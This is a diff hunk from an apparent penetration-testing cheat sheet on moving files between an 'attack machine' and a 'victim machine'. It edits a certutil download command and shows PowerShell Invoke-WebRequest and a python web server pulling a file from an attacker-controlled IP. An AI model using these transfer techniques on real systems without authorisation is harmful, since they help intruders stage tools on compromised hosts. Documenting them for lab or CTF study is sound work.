@@ -28,7 +28,7 @@ PS> Invoke-WebRequest -Uri http://10.10.10.2:8000/file.txt -OutFile .\file.txt .
 <b># attack machine</b>
 $ python -m http.server 8000
 <b># victim machine</b>
-C:\> certutil -urlcache -split -f http://10.10.10.2:8000/file.txt
+C:\> certutil -urlcache -f http://10.10.10.2:8000/file.txt > file.txt
 </pre>
 ### From Victim host (Linux) to Attack host
 * python web server + wget
